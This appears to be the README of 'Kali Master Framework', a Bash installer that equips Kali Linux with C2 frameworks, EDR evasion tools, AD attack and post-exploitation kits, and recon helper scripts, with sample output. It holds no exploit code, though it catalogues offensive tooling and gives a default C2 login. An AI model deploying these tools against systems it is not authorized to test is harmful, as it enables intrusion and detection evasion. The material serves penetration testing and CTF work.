# Kali Master Framework v6.7.0

> **Ultimate Offensive Security Platform — Built for Elite Practitioners**
>
> Bug Bounty · Red Team · Reverse Engineering · CTF (HTB / THM / HackMyVM) · AD Attacks · Cloud Security · EDR Evasion

<div align="center">

```
 ██╗ ██╗  █████╗ ██╗     ██╗    ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗
 ██║ ██╔╝██╔══██╗██║     ██║    ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
 █████╔╝ ███████║██║     ██║    ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝
 ██╔═██╗ ██╔══██║██║     ██║    ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗
 ██║ ██╗ ██║  ██║███████╗██║    ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║
 ╚═╝ ╚═╝ ╚═╝  ╚═╝╚══════╝╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

[![Version](https://img.shields.io/badge/version-6.7.0-magenta?style=flat-square)](https://github.com/vulnquest58)
[![Platform](https://img.shields.io/badge/platform-Kali%20Linux-blue?style=flat-square&logo=kalilinux)](https://www.kali.org/)
[![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)](LICENSE)
[![Author](https://img.shields.io/badge/author-vulnquest58-red?style=flat-square&logo=github)](https://github.com/vulnquest58)
[![Shell](https://img.shields.io/badge/shell-bash-89e051?style=flat-square&logo=gnubash)](https://www.gnu.org/software/bash/)
[![Tools](https://img.shields.io/badge/tools-300%2B-orange?style=flat-square)](https://github.com/vulnquest58/kali-master-framework)
[![C2](https://img.shields.io/badge/C2%20Frameworks-8-red?style=flat-square)](https://github.com/vulnquest58/kali-master-framework)
[![Labs](https://img.shields.io/badge/Docker%20Labs-30-blue?style=flat-square)](https://github.com/vulnquest58/kali-master-framework)

</div>

---

## 📋 Table of Contents

- [Overview](#overview)
- [What's New in v6.7.0](#whats-new-in-v670)
- [Requirements](#requirements)
- [Installation](#installation)
- [Usage](#usage)
- [Modes](#modes)
- [Installation Output Example](#installation-output-example)
- [Steps Reference (25 Steps)](#steps-reference-25-steps)
- [Helper Scripts (25 Scripts)](#helper-scripts-25-scripts)
- [Directory Structure](#directory-structure)
- [Tool Categories (300+ Tools)](#tool-categories-300-tools)
- [Credentials Reference](#credentials-reference)
- [Legal Notice](#legal-notice)
- [Author](#author)

---

## 🎯 Overview

**Kali Master Framework v6.7.0** is a fully automated, single-file Bash script that transforms a fresh Kali Linux installation into a complete offensive security workstation. It is designed for practitioners who work across multiple disciplines simultaneously — bug bounty, red teaming, reverse engineering, competitive CTF platforms, Active Directory attacks, cloud security, and EDR evasion.

### ✨ Key Features

- **🔄 State Machine** — Every step is tracked; re-running the script skips completed steps automatically
- **⏱️ Auto-calculated ETA** — Real-time progress with estimated time remaining displayed at each step
- **🔧 Three-tier Fallback** — Every tool attempts installation via `apt → pip/go/cargo → GitHub release` before failing
- **🛠️ Universal Auto-Fix Engine** — Automatically detects and repairs 68+ missing tools after installation
- **🛡️ OPSEC-ready** — C2 redirector automation with Nginx + Let's Encrypt SSL built in
- **🎭 EDR Evasion Suite** — Donut, ScareCrow, SGN, Freeze, Inceptor, Pezor, PE-Sieve, Hollows Hunter, Nimcrypt2
- **🏢 Advanced AD Attacks** — certipy-ad, pywhisker, targetedKerberoast, ldeep, windapsearch
- **☁️ Cloud Security** — pacu, cloudfox, scoutsuite, gitleaks, trivy, grype, syft
- **🎯 C2 Frameworks** — Sliver, Havoc, Mythic, Covenant, Empire, Starkiller, Merlin, NimPlant
- **🐳 Docker Labs** — 30 vulnerable labs across 8 categories
- **📊 Professional Dashboard** — 11 commands for system management
- **📦 Single File** — No external dependencies, no Ansible, no Docker orchestration required

---

## 🆕 What's New in v6.7.0

### 🎉 Major Additions (36+ New Tools)

| Category | New Tools |
|----------|-----------|
| **Bug Bounty** | `ghauri` (advanced SQLi), `nomore403` (403 bypass), `smuggler` (HTTP smuggling), `cent` (nuclei templates manager), `cloud_enum` (cloud enumeration), `shosubgo` (Shodan subdomains), `github-dorker` |
| **Active Directory** | `certipy-ad` (AD CS exploitation), `pywhisker` (AD CS attacks), `targetedKerberoast`, `ldeep` (LDAP enumeration), `windapsearch` (Go-based AD search) |
| **Evasion** | `Freeze` (payload obfuscation), `Inceptor` (AV/EDR bypass), `Pezor` (PE packer) + **Fixed**: ScareCrow (Garble + ScareCrow.go), SGN (keystone-engine + libkeystone.so) |
| **Reverse Engineering** | `ImHex` (hex editor), `pwninit` (CTF binary patcher), `rizin`, `cutter` |
| **Cloud Security** | `pacu` (AWS exploitation), `cloudfox` (cloud enumeration), `scoutsuite` (multi-cloud auditing), `gitleaks` (secrets detection) |
| **Post-Exploitation** | `mimikatz`, `Rubeus`, `SharpUp` (Windows), `gtfobins-search`, `beroot` (Linux) |
| **CTF** | `factordb-cli`, `ciphey` (auto decode), `volatility2`, `heapinspect` |

### 🛠️ Critical Bug Fixes

- ✅ **Merlin**: Direct symlinks (no build needed)
- ✅ **ScareCrow**: Garble + `ScareCrow.go` build
- ✅ **SGN**: keystone-engine + libkeystone.so + `go build .`
- ✅ **Certbot**: Symlink + apt fallback
- ✅ **smart_find_tool()**: Case-insensitive search across 7 paths
- ✅ **TOOL_INSTALL_MAP**: Safe lookup with `:-` to prevent unbound variable errors
- ✅ **update-tools**: Fixed arithmetic errors in package counting

### 🆕 New Helper Scripts (25 Scripts)

- `api-recon` — API reconnaissance
- `cloud-recon` — Cloud enumeration
- `port-scan` — Port scanner (5 profiles)
- `dir-fuzz` — Directory fuzzer
- `vuln-scan` — Vulnerability scanner
- `newredteam` — Red Team operation workspace
- `pe-server` — Dynamic HTTP server
- `pe-transfer` — Quick file transfer
- `revshell` — Reverse shell generator (9 types)
- `secrets-manager` — API keys manager
- `check_tools_status` — Tool status checker
- `helper-menu` — Interactive helper menu
- `notify-recon` — Notification sender
- `merge-results` — Scan results merger

### 🆕 New Dashboard Commands

- `kali-master certipy` — AD CS commands overview
- `kali-master cloud` — Cloud tools overview
- `kali-master evasion` — Evasion toolkit
- `kali-master postex` — Post-exploitation kit

---

## 📋 Requirements

| Requirement | Minimum | Recommended |
|------------|---------|-------------|
| **OS** | Kali Linux 2023.x | Kali Linux 2026.x (latest) |
| **RAM** | 4 GB | 8 GB+ |
| **Disk** | 15 GB free | 40 GB+ free |
| **Network** | Required | Stable broadband |
| **Privileges** | root | root |
| **Architecture** | x86_64 | x86_64 |

---

## 📥 Installation

```bash
# Clone or download the script
git clone https://github.com/vulnquest58/kali-master-framework.git
cd kali-master-framework

# Make executable
chmod +x kali_master_v6.7.0.sh

# Full installation (recommended)
sudo bash kali_master_v6.7.0.sh

# Lightweight install (core tools only)
sudo bash kali_master_v6.7.0.sh --minimal

# Run auto-fix only (repair missing tools)
sudo bash kali_master_v6.7.0.sh --fix

# Run specific step
sudo bash kali_master_v6.7.0.sh --step redteam_c2 --force

# With GitHub token (avoids rate limits)
GITHUB_TOKEN=ghp_xxx sudo bash kali_master_v6.7.0.sh
```

---

## 🎮 Usage

```
Usage: kali_master_v6.7.0.sh [OPTIONS]

Options:
  (no options)         Full installation — all 25 steps
  --minimal            Minimal install — core tools only
  --fix                Auto-fix missing tools only, no full install
  --step <name>        Run a single step only (idempotent)
  --reset <name>       Reset state for one step so it re-runs
  --reset-all          Reset all step states (full re-run)
  --force              Force re-run of all steps regardless of state
  --help, -h           Show this help message

Available Steps:
   1. network_fix       2. snapshot           3. system_update
   4. python_venv       5. golang             6. docker
   7. bugbounty         8. reversing          9. ctf
  10. ad_network       11. cloud_security    12. wordlists
  13. shell_config     14. secrets           15. vm_hardening
  16. update_manager   17. helper_scripts    18. redteam_c2
  19. c2_redirector    20. evasion_tools     21. post_exploit
  22. lab_manager      23. c2_menu           24. auto_fix
  25. dashboard

Examples:
  sudo bash kali_master_v6.7.0.sh --step bugbounty
  sudo bash kali_master_v6.7.0.sh --reset redteam_c2 --step redteam_c2
  sudo bash kali_master_v6.7.0.sh --force
  GITHUB_TOKEN=ghp_xxx sudo bash kali_master_v6.7.0.sh
```

---

## 🎛️ Modes

### Full Mode (default)

Installs all 25 steps including C2 frameworks, EDR evasion tools, post-exploitation kit, AD attack tools, cloud security, and redirector automation.

```bash
sudo bash kali_master_v6.7.0.sh
```

### Minimal Mode

Installs only core dependencies, Go, Python venv, and essential network tools. Skips Docker, reversing tools, CTF extras, C2 frameworks, evasion tools, and post-exploit kit.

```bash
sudo bash kali_master_v6.7.0.sh --minimal
```

### Fix Mode

Scans for missing or broken tools and attempts repair using the three-tier fallback engine. Does not re-run any installation steps.

```bash
sudo bash kali_master_v6.7.0.sh --fix
```

---

## 📺 Installation Output Example

### Full Installation Output

```
╔═══════════════════════════════════════════════════════╗
║   KALI MASTER FRAMEWORK v6.7.0                        ║
║   Ultimate Offensive Security Platform                ║
╚═══════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════
  PRE-FLIGHT CHECKS
═══════════════════════════════════════════════════════
  [✔] Kali Linux detected
  [✔] Root confirmed
  [✔] Internet active
  [✔] Disk: 50GB free
  [✔] RAM: 16GB

═══════════════════════════════════════════════════════
  ▶ STEP 1/25 — NETWORK FIX
═══════════════════════════════════════════════════════
  [*] Hardening network / DNS...
  [✔] IPv6 disabled
  [✔] DNS fallbacks added (1.1.1.1, 8.8.8.8)
  [✔] apt forced to IPv4
  [✔] GOPROXY configured

═══════════════════════════════════════════════════════
  ▶ STEP 7/25 — BUG BOUNTY TOOLS
═══════════════════════════════════════════════════════
  [*] Installing ProjectDiscovery Suite...
    [✔] subfinder [installed]
    [✔] httpx [installed]
    [✔] nuclei [installed]
    [✔] dnsx [installed]
    ... (14 more)
  [✔] ProjectDiscovery suite: 18/18 ready

  [*] Installing other Go tools...
    [✔] dalfox [installed]
    [✔] gobuster [installed]
    [✔] ffuf [installed]
    ... (17 more)
  [✔] Go tools: 20/20 ready

  [*] Installing Python tools...
    [✔] xsstrike [installed]
    [✔] corsy [installed]
    [✔] linkfinder [installed]
    ... (8 more)
  [✔] Python tools: 11/11 ready

═══════════════════════════════════════════════════════
  ▶ STEP 18/25 — RED TEAM C2 FRAMEWORKS
═══════════════════════════════════════════════════════
  [*] Installing Sliver C2...
    [✔] Sliver [installed]

  [*] Building Havoc C2...
    [✔] Teamserver built
    [✔] Client built
    [✔] Havoc [built and ready]

  [*] Setting up Mythic C2...
    [*] Resetting Mythic database (safe)...
    [*] Starting Mythic...
    [✔] Mythic [running]
  [*] Login: mythic_admin / Admin123!

  [*] Building Covenant C2...
    [*] Installing libssl1.1...
    [*] Building Covenant...
    [✔] Covenant [ready]

  ... (4 more frameworks)

  [✔] C2 tools verified: 8/8

═══════════════════════════════════════════════════════
  ▶ STEP 20/25 — POST-EXPLOITATION KIT
═══════════════════════════════════════════════════════
  [PHASE 1/11] CORE COMMUNICATION TOOLS
    [✔] netcat-openbsd [installed]
    [✔] ncat [installed]
    [✔] socat [installed]
    ... (5 more)
  [✔] Communication tools: 8/8 ready

  [PHASE 2/11] LINUX PRIVILEGE ESCALATION
    [*] Downloading linpeas.sh...
    [✔] linpeas.sh [downloaded]
    [*] Downloading pspy64...
    [✔] pspy64 [downloaded]
    ... (6 more)
  [✔] Linux PE tools: 8/8 ready

  [PHASE 7/11] DYNAMIC HTTP SERVER
    [✔] pe-server [created]

  [PHASE 10/11] REVERSE SHELL GENERATOR
    [✔] revshell [created]

  [✔] Post-exploitation tools verified: 6/6

═══════════════════════════════════════════════════════
  FINAL HEALTH CHECK
═══════════════════════════════════════════════════════
  [PHASE 2/7] SCANNING TOOLS BY CATEGORY

  [Bug Bounty Tools] (28 tools)
    [✔] nuclei → /usr/local/bin/nuclei
    [✔] subfinder → /usr/local/bin/subfinder
    ... (26 more)
    Category Status: 28/28 (100%)

  [C2 Frameworks] (8 tools)
    [✔] sliver-server → /usr/local/bin/sliver-server
    [✔] havoc → /usr/local/bin/havoc
    ... (6 more)
    Category Status: 8/8 (100%)

  CATEGORY BREAKDOWN
    ✔ Bug Bounty Tools: 28/28 (100%)
    ✔ Network & Exploitation: 10/10 (100%)
    ✔ Reverse Engineering: 16/16 (100%)
    ✔ C2 Frameworks: 8/8 (100%)
    ✔ Cloud Security: 5/5 (100%)
    ✔ EDR/AV Evasion: 7/7 (100%)
    ✔ Post-Exploitation: 4/4 (100%)
    ✔ Active Directory: 4/4 (100%)
    ✔ Runtimes & Core: 7/7 (100%)

  OVERALL STATUS
    [████████████████████████████████████████████████████] 100%

═══════════════════════════════════════════════════════
  🎉 KALI MASTER FRAMEWORK v6.7.0 — READY FOR ACTION! 🎉
═══════════════════════════════════════════════════════

  Duration:       58m 34s
  Total Checked:  106 items
  Passed:         106 items
  Failed:         0 items
  Success Rate:   100%

  🎉 All tools are installed!

  Quick Commands:
    kali-master status       → Show dashboard
    c2-menu                  → C2 launcher
    lab-manager              → Lab manager
    postexploit-menu         → Post-exploitation menu
    evasion-menu             → Evasion toolkit
```

### Final Summary Output

```
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║            ██╗  ██╗ █████╗ ██╗     ██╗                  ║
║            ██║ ██╔╝██╔══██╗██║     ██║                 ║
║            █████╔╝ ███████║██║     ██║                ║
║            ██╔═██╗ ██╔══██║██║     ██║                 ║
║            ██║  ██╗██║  ██║███████╗██║                 ║
║            ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝                ║
║                                                       ║
║   ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗   ║
║   ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗  ║
║   ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝  ║
║   ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗  ║
║   ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║    ║   
║   ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ║
║                                                           ║
║                 INSTALLATION COMPLETE! 🎉                 ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝

  INSTALLATION INFO
  ────────────────────────────────────────────────────────
  Version:       Kali Master Framework v6.7.0
  Duration:      58m 34s
  Log File:      /var/log/kali_master_v6_20260604_172426.log
  Completed:     2026-06-04 18:27:02

  STATISTICS
  ────────────────────────────────────────────────────────
  ● /usr/local/bin:     107 tools
  ● Go binaries:        29 tools
  ● Cargo binaries:     1 tools
  ● Python packages:    289 packages
  ● C2 frameworks:      7 frameworks
  ● Post-exploit files: 105 files
  ● Evasion tools:      5 tools
  ● Total disk usage:   1.1G + 770M + 1052.2M

  🚀 NEXT STEPS
  ────────────────────────────────────────────────────────
    1. Open a new terminal to activate all tools
    2. Run p10k configure to customize your shell
    3. Configure API keys: secrets-manager
    4. Check status: kali-master status
    5. Start exploring: c2-menu or lab-manager

═══════════════════════════════════════════════════════
  🎉 KALI MASTER FRAMEWORK v6.7.0 — READY FOR ACTION! 🎉
═══════════════════════════════════════════════════════

  Thank you for using Kali Master Framework!
  Happy hacking! 🚀
```

---

## 📊 Steps Reference (25 Steps)

The script executes **25 ordered steps**. Step count and ETA are calculated automatically at runtime.

| # | Step Name | Description | Tools Installed |
|---|-----------|-------------|-----------------|
| 1 | `network_fix` | DNS hardening, IPv6 toggle, GOPROXY setup, apt force IPv4 | — |
| 2 | `snapshot` | VMware detection, Timeshift snapshot | — |
| 3 | `system_update` | apt upgrade + 60+ build dependencies | 60+ packages |
| 4 | `python_venv` | Central venv, angr venv, FLARE venv, 30+ pip packages | 289 packages |
| 5 | `golang` | Latest Go release auto-detection and install | Go 1.26.4 |
| 6 | `docker` | Docker CE + BuildX + Compose plugin | Docker CE |
| 7 | `bugbounty` | 45+ tools: ProjectDiscovery suite, tomnomnom tools, XSStrike, ghauri, smuggler... | 60+ tools |
| 8 | `reversing` | GDB + pwndbg/GEF/PEDA, Ghidra, radare2, rizin, cutter, angr, FLARE, ImHex, pwninit | 30+ tools |
| 9 | `ctf` | CTF-specific: john, hashcat, RSACtfTool, steghide, stegseek, ciphey, factordb-cli... | 25+ tools |
| 10 | `ad_network` | AD: BloodHound, Impacket, CrackMapExec, evil-winrm, kerbrute, certipy-ad, pywhisker, ldeep, windapsearch... | 35+ tools |
| 11 | `cloud_security` | trivy, grype, syft, kubectl, AWS CLI, pacu, cloudfox, scoutsuite, gitleaks | 30+ tools |
| 12 | `wordlists` | SecLists, rockyou, kali wordlists | 15+ lists |
| 13 | `shell_config` | zsh + Oh-My-Zsh + Powerlevel10k + plugins | 7 plugins |
| 14 | `secrets` | Secrets manager scaffold (API keys storage) | 40+ variables |
| 15 | `vm_hardening` | sysctl tuning: ptrace, file-max, somaxconn | — |
| 16 | `update_manager` | `update-tools` script (18-step updater) | 1 script |
| 17 | `helper_scripts` | `bb-recon`, `newbb`, `newctf`, `newad`, `newpayload` workspace helpers | 17 scripts |
| 18 | `redteam_c2` | Sliver, Havoc, Mythic, Covenant, Empire, Starkiller, Merlin, NimPlant | 8 frameworks |
| 19 | `c2_redirector` | Nginx + Let's Encrypt C2 redirector automation | Nginx + Certbot |
| 20 | `evasion_tools` | Donut, ScareCrow, SGN, Freeze, Inceptor, Pezor, PE-Sieve, Hollows Hunter, Nimcrypt2 | 9 tools |
| 21 | `post_exploit` | linpeas, winpeas, chisel, pspy, ligolo-ng, mimikatz, Rubeus, SharpUp, gtfobins-search, beroot | 35+ tools |
| 22 | `lab_manager` | Docker lab manager: 30 labs across 8 categories | 30 labs |
| 23 | `c2_menu` | Interactive C2 launcher with status dashboard | 1 script |
| 24 | `auto_fix` | Universal auto-fix engine (68+ tools) | — |
| 25 | `dashboard` | `kali-master` command dashboard (11 commands) | 1 script |

---

## 🛠️ Helper Scripts (25 Scripts)

All helper scripts are installed to `/usr/local/bin/` and available system-wide after installation.

### Reconnaissance Scripts (7)

| Script | Description | Usage |
|--------|-------------|-------|
| `bb-recon` | Bug Bounty reconnaissance (12 steps) | `bb-recon <domain> [--deep\|--quick\|--passive]` |
| `sub-enum` | Subdomain enumeration (5 tools) | `sub-enum <domain>` |
| `api-recon` | API reconnaissance | `api-recon <url> [--deep\|--quick]` |
| `cloud-recon` | Cloud enumeration (AWS/Azure/GCP) | `cloud-recon <target> [aws\|azure\|gcp\|all]` |
| `port-scan` | Port scanner (5 profiles) | `port-scan <target> [quick\|standard\|full\|vuln\|stealth]` |
| `dir-fuzz` | Directory fuzzer | `dir-fuzz <url> [wordlist]` |
| `vuln-scan` | Vulnerability scanner (Nuclei) | `vuln-scan <target\|file> [severity]` |

### Workspace Creators (5)

| Script | Description | Usage |
|--------|-------------|-------|
| `newbb` | Bug Bounty workspace | `newbb <domain> [program_name]` |
| `newctf` | CTF workspace | `newctf <name> [htb\|thm\|ctfd\|pico\|other]` |
| `newad` | Active Directory workspace | `newad <domain> [dc-ip]` |
| `newpayload` | Payload development workspace | `newpayload <name> [windows\|linux\|web\|macro\|shellcode]` |
| `newredteam` | Red Team operation workspace | `newredteam <operation_name>` |

### Post-Exploitation Scripts (4)

| Script | Description | Usage |
|--------|-------------|-------|
| `pe-server` | Dynamic HTTP server (auto port) | `pe-server [port]` |
| `pe-transfer` | Quick file transfer | `pe-transfer <file> [target_ip]` |
| `revshell` | Reverse shell generator (9 types) | `revshell <ip> <port> [type]` |
| `postexploit-menu` | Post-exploitation menu | `postexploit-menu` |

### Management Scripts (5)

| Script | Description | Usage |
|--------|-------------|-------|
| `lab-manager` | Docker labs manager (30 labs) | `lab-manager` |
| `c2-menu` | C2 frameworks launcher (8 frameworks) | `c2-menu` |
| `evasion-menu` | EDR evasion toolkit menu | `evasion-menu` |
| `secrets-manager` | API keys manager | `secrets-manager [command]` |
| `update-tools` | Update manager (18 steps) | `update-tools [OPTIONS] [COMPONENT]` |

### Utility Scripts (4)

| Script | Description | Usage |
|--------|-------------|-------|
| `setup-redirector` | C2 redirector setup (Nginx + SSL) | `setup-redirector` |
| `notify-recon` | Notification sender | `notify-recon <title> <message> [channel]` |
| `merge-results` | Scan results merger | `merge-results <output> <inputs...>` |
| `check_tools_status` | Tool status checker | `check_tools_status [mode]` |

---

### 1. bb-recon — Bug Bounty Recon

Automated reconnaissance pipeline for a target domain with 12 steps.

```bash
bb-recon <domain> [--deep|--quick|--passive]

# Examples
bb-recon example.com
bb-recon example.com --deep
bb-recon example.com --passive --notify
```

#### Output Example

```
██████╗ ██████╗       ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔══██╗██╔══██╗      ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
██████╔╝██████╔╝█████╗██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██╔══██╗██╔══██╗╚════╝██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
██████╔╝██████╔╝      ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚═════╝ ╚═════╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ 
  Professional Bug Bounty Reconnaissance — v2.0
  OWASP Testing Guide + Bug Bounty Hunter Methodology
  ────────────────────────────────────────────────────────

  Target: example.com
  Mode:   deep
  Output: /root/bugbounty/example.com/recon_20260604_190831

  [*] Starting recon in 3 seconds... (Ctrl+C to cancel)

═══════════════════════════════════════════════════════
  ▶ STEP 1/12 — PASSIVE SUBDOMAIN ENUMERATION
═══════════════════════════════════════════════════════
  [*] Running Subfinder...
  [✔] Subfinder: 1,234 subdomains
  [*] Running Assetfinder...
  [✔] Assetfinder: 856 subdomains
  [*] Running Amass (passive)...
  [✔] Amass: 2,100 subdomains

  [✔] Total passive subdomains: 3,456

═══════════════════════════════════════════════════════
  ▶ STEP 3/12 — HTTP PROBING (httpx)
═══════════════════════════════════════════════════════
  [*] Probing live hosts...
  [✔] Live hosts: 1,890

═══════════════════════════════════════════════════════
  ▶ STEP 8/12 — VULNERABILITY SCANNING (Nuclei)
═══════════════════════════════════════════════════════
  [*] Running nuclei (severity: low,medium,high,critical)...
  [✔] Vulnerabilities found: 45

  Breakdown by severity:
    • critical: 3
    • high: 12
    • medium: 18
    • low: 8
    • info: 4

═══════════════════════════════════════════════════════
  RECONNAISSANCE COMPLETE
═══════════════════════════════════════════════════════

  Target:    example.com
  Mode:      deep
  Duration:  15m 23s
  Output:    /root/bugbounty/example.com/recon_20260604_190831

  Results:
    • Subdomains:     3,456
    • Live Hosts:     1,890
    • URLs:           12,345
    • JS Files:       234
    • Vulnerabilities: 45

  ⚠ Review vulnerabilities in: .../vulns/nuclei.txt
```

**Output location:**
```
~/bugbounty/<domain>/recon_YYYYMMDD_HHMM/
├── subdomains/          # Subdomain enumeration results
│   ├── passive.txt
│   ├── subfinder.txt
│   ├── assetfinder.txt
│   ├── amass.txt
│   ├── resolved.txt
│   └── all.txt
├── http/                # HTTP probing results
│   ├── alive.txt
│   ├── urls.txt
│   └── status_*.txt
├── ports/               # Port scan results
├── urls/                # URL discovery results
│   ├── gau.txt
│   ├── wayback.txt
│   ├── katana.txt
│   └── all_urls.txt
├── js/                  # JavaScript analysis
│   ├── js_files.txt
│   ├── endpoints.txt
│   └── subjs.txt
├── params/              # Parameter discovery
│   ├── arjun.txt
│   ├── xss.txt
│   ├── ssti.txt
│   └── ssrf.txt
├── vulns/               # Vulnerability findings
│   ├── nuclei.txt
│   ├── dalfox.txt
│   └── cors.json
└── report.md            # Final report
```

---

### 2. sub-enum — Subdomain Enumeration

Professional subdomain enumeration with 5 tools.

```bash
sub-enum <domain>

# Example
sub-enum example.com
```

#### Output Example

```
  [*] Target: example.com
  [*] Output: /root/subdomains/example.com/20260604_190831

  [1/5] Subfinder...
  [✔] 1,234 subdomains
  [2/5] Assetfinder...
  [✔] 856 subdomains
  [3/5] Amass (passive)...
  [✔] 2,100 subdomains
  [4/5] Resolving with dnsx...
  [✔] 3,200 resolved
  [5/5] HTTP probing...
  [✔] 1,890 live hosts

═══════════════════════════════════════════════════════
  ENUMERATION COMPLETE
═══════════════════════════════════════════════════════
  Total:  3,456 subdomains
  Output: /root/subdomains/example.com/20260604_190831/
```

---

### 3. api-recon — API Reconnaissance

API reconnaissance and endpoint discovery.

```bash
api-recon <url> [--deep|--quick]

# Example
api-recon https://api.example.com --deep
```

#### Output Example

```
  [*] Target: https://api.example.com
  [*] Output: /root/api-recon/api_example_com_20260604_190831

  [1/5] Discovering API endpoints...
  [✔] Found 234 API endpoints

  [2/5] Checking for API documentation...
  [✔] Found: swagger.json
  [✔] Found: openapi.json

  [3/5] Testing authentication...
  [✔] Tested 20 endpoints

  [4/5] Discovering parameters...
  [✔] Found 45 parameters

  [5/5] Generating report...

  [✔] API Recon Complete
  [✔] Results: /root/api-recon/api_example_com_20260604_190831/
```

---

### 4. cloud-recon — Cloud Enumeration

Cloud infrastructure enumeration for AWS, Azure, and GCP.

```bash
cloud-recon <target> [aws|azure|gcp|all]

# Examples
cloud-recon example.com aws
cloud-recon example.com all
```

#### Output Example

```
  [*] Target: example.com
  [*] Provider: all
  [*] Output: /root/cloud-recon/example.com_20260604_190831

  [1/4] AWS Enumeration...
  [✔] AWS CLI configured
  [✔] Found 12 S3 buckets

  [2/4] Azure Enumeration...
  [✔] Azure CLI configured
  [✔] Found 8 storage accounts

  [3/4] GCP Enumeration...
  [✔] GCloud CLI configured
  [✔] Found 5 buckets

  [4/4] Generating report...

  [✔] Cloud Recon Complete
  [✔] Results: /root/cloud-recon/example.com_20260604_190831/
```

---

### 5. port-scan — Port Scanner

Professional port scanner with 5 profiles.

```bash
port-scan <target> [profile]

# Profiles: quick, standard, full, vuln, stealth

# Examples
port-scan 10.0.0.1 quick
port-scan 10.0.0.1 full
port-scan 10.0.0.1 vuln
```

#### Output Example

```
  [*] Target:  10.0.0.1
  [*] Profile: full
  [*] Output:  /root/scans/10.0.0.1_20260604_190831

  [1/3] Full port scan (all 65535)...
  [2/3] Service detection on open ports...
  [3/3] Generating report...

  [✔] Scan complete
  [✔] Results: /root/scans/10.0.0.1_20260604_190831/
```

---

### 6. dir-fuzz — Directory Fuzzer

Professional directory fuzzer using ffuf and gobuster.

```bash
dir-fuzz <url> [wordlist]

# Example
dir-fuzz https://example.com
dir-fuzz https://example.com /opt/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

#### Output Example

```
  [*] URL:      https://example.com
  [*] Wordlist: /opt/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
  [*] Output:   /root/dir-fuzz/https_example_com_20260604_190831

  [1/2] Running ffuf...
  [2/2] Running gobuster...

  [✔] Fuzzing complete
  [✔] Results: /root/dir-fuzz/https_example_com_20260604_190831/
```

---

### 7. vuln-scan — Vulnerability Scanner

Professional vulnerability scanner using Nuclei.

```bash
vuln-scan <target|file> [severity]

# Severity: low, medium, high, critical (comma-separated)

# Examples
vuln-scan https://example.com
vuln-scan urls.txt high,critical
```

#### Output Example

```
  [*] Target:   https://example.com
  [*] Severity: low,medium,high,critical
  [*] Output:   /root/vuln-scans/20260604_190831

  [1/3] Scanning single target...
  [2/3] Running Nuclei...
  [✔] Nuclei: 23 findings
  [3/3] Generating report...

═══════════════════════════════════════════════════════
  SCAN COMPLETE
═══════════════════════════════════════════════════════
  Findings: 23
  Report:   /root/vuln-scans/20260604_190831/report.md
  JSON:     /root/vuln-scans/20260604_190831/nuclei.json
```

---

### 8. newbb — Bug Bounty Workspace

Creates a structured Bug Bounty workspace for a target domain.

```bash
newbb <domain> [program_name]

# Example
newbb example.com
newbb example.com hackerone-program
```

#### Output Example

```
  [*] Creating Bug Bounty workspace for: example.com
  [*] Program: example.com

    [+] recon — Subdomain enumeration, port scanning, service detection
    [+] recon/subdomains — Subdomain lists from various tools
    [+] recon/ports — Port scan results
    [+] exploitation — Exploit development and testing
    [+] exploitation/poc — Proof of Concept files
    [+] vulnerabilities — Discovered vulnerabilities
    [+] reports — Final reports and submissions
    [+] notes — Working notes and observations
    [+] loot — Credentials, sensitive data (ENCRYPTED)

═══════════════════════════════════════════════════════
  WORKSPACE CREATED SUCCESSFULLY
═══════════════════════════════════════════════════════

  Location: /root/bugbounty/example.com

  Next steps:
    cd /root/bugbounty/example.com
    bb-recon example.com --deep
    vim notes/initial-notes.md
```

---

### 9. newctf — CTF Workspace

Creates a structured CTF workspace for a challenge or machine.

```bash
newctf <name> [htb|thm|ctfd|pico|other]

# Examples
newctf keeper htb
newctf corridor thm
newctf web-challenge ctfd
```

#### Output Example

```
  [*] Creating CTF workspace: keeper
  [*] Platform: htb

    [+] web — Web exploitation, XSS, SQLi, SSRF, etc.
    [+] pwn — Binary exploitation, buffer overflow, ROP
    [+] crypto — Cryptography, encoding, hashing
    [+] forensics — Memory, disk, network forensics
    [+] reverse — Reverse engineering, malware analysis
    [+] stego — Steganography, hidden data
    [+] misc — Miscellaneous challenges
    [+] osint — Open Source Intelligence
    [+] notes — General notes and writeups
    [+] tools — Custom tools and scripts
    [+] flags — Captured flags

═══════════════════════════════════════════════════════
  CTF WORKSPACE CREATED
═══════════════════════════════════════════════════════

  Location: /root/ctf/htb/keeper
  Next:    cd /root/ctf/htb/keeper
```

---

### 10. newad — AD Workspace

Creates a structured Active Directory engagement workspace.

```bash
newad <domain> [dc-ip]

# Example
newad corp.local 10.0.0.1
```

#### Output Example

```
  [*] Creating AD workspace: corp.local

    [+] recon — Domain reconnaissance
    [+] recon/users — User enumeration results
    [+] recon/groups — Group enumeration
    [+] bloodhound — BloodHound data
    [+] kerberos — Kerberos tickets and attacks
    [+] ntlm — NTLM relay and attacks
